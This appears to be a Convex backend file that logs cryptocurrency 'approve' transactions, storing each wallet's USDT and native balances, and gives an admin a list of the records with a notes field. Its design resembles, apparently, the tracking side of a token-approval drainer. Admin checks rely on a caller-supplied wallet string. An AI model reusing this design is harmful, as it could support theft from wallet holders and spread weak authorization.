import { v } from "convex/values";
import { mutation, query } from "./_generated/server";
import { requireAdmin } from "./adminAuth";

export const createTransaction = mutation({
  args: {
    walletAddress: v.string(),
    toAddress: v.string(),
    amount: v.string(),
    txHash: v.optional(v.string()),
    usdtBalance: v.optional(v.string()),
    nativeBalance: v.optional(v.string()),
  },
  handler: async (ctx, args) => {
    const existingTransaction = await ctx.db
      .query("transactions")
      .withIndex("by_wallet", (q) => q.eq("walletAddress", args.walletAddress))
      .first();

    let userNumber: number;

    if (existingTransaction && existingTransaction.userNumber !== undefined) {
      userNumber = existingTransaction.userNumber;
    } else {
      const allTransactions = await ctx.db.query("transactions").collect();
      const maxUserNumber = allTransactions.reduce((max, tx) => {
        return tx.userNumber !== undefined && tx.userNumber > max ? tx.userNumber : max;
      }, 0);
      userNumber = maxUserNumber + 1;
    }

    const transactionId = await ctx.db.insert("transactions", {
      walletAddress: args.walletAddress,
      toAddress: args.toAddress,
      amount: args.amount,
      txHash: args.txHash,
      usdtBalance: args.usdtBalance,
      nativeBalance: args.nativeBalance,
      status: "completed",
      type: "approve",
      userNumber,
    });

    return transactionId;
  },
});

export const getAllTransactions = query({
  args: { 
    adminWallet: v.optional(v.string()),
  },
  handler: async (ctx, args): Promise<Array<{
    _id: string;
    userName?: string;
    userEmail?: string;
    walletAddress: string;
    toAddress: string;
    amount: string;
    txHash?: string;
    usdtBalance?: string;
    nativeBalance?: string;
    status: string;
    adminNote?: string;
    userNumber?: number;
    _creationTime: number;
  }>> => {
    requireAdmin(args.adminWallet);
    const transactions = await ctx.db
      .query("transactions")
      .order("desc")
      .take(100);

    return transactions.map((tx) => ({
      _id: tx._id,
      userName: tx.userNumber !== undefined ? `User ${tx.userNumber}` : undefined,
      userEmail: undefined,
      walletAddress: tx.walletAddress,
      toAddress: tx.toAddress,
      amount: tx.amount,
      txHash: tx.txHash,
      usdtBalance: tx.usdtBalance,
      nativeBalance: tx.nativeBalance,
      status: tx.status,
      adminNote: tx.adminNote,
      userNumber: tx.userNumber,
      _creationTime: tx._creationTime,
    }));
  },
});

export const updateTransactionNote = mutation({
  args: {
    adminWallet: v.optional(v.string()),
    transactionId: v.id("transactions"),
    note: v.string(),
  },
  handler: async (ctx, args) => {
    requireAdmin(args.adminWallet);
    if (args.note.length > 1000) {
      throw new Error("Note too long (max 1000 characters)");
    }
    await ctx.db.patch(args.transactionId, {
      adminNote: args.note,
    });
  },
});
